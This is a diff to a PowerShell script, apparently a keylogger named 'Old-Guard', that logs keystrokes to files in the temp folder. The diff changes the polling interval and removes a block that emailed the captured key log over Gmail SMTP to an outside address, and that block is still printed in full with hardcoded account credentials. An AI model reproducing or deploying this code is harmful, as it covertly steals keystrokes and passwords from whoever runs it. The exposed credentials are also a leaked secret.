@@ -112,7 +112,7 @@ function Old-Guard {
                 $ImportDll = $TypeBuilder.CreateType()
             }
 
-            Start-Sleep -Milliseconds $PollingInterval
+            Start-Sleep -Seconds $PollingInterval
 
                 try
                 {
@@ -186,19 +186,7 @@ function Old-Guard {
                             Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
                             Copy-item "$env:TEMP/key.log" -Destination "$env:TEMP/key_final.txt"
                             
-                            #email results
-                            $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
-                            $SMTPInfo.EnableSsl = $true
-                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
-                            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
-                            $ReportEmail.To.Add('warof1846@gmail.com')
-                            $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-                            $ReportEmail.Body = 'Report 001'
-                            $ReportEmail.Attachments.Add('%temp%/key_final.txt')
-                            $SMTPInfo.Send($ReportEmail)
-                            $SMTPInfo.Send($ReportEmail)
-                            
-                            
+                           
                         }
                     }
                 }
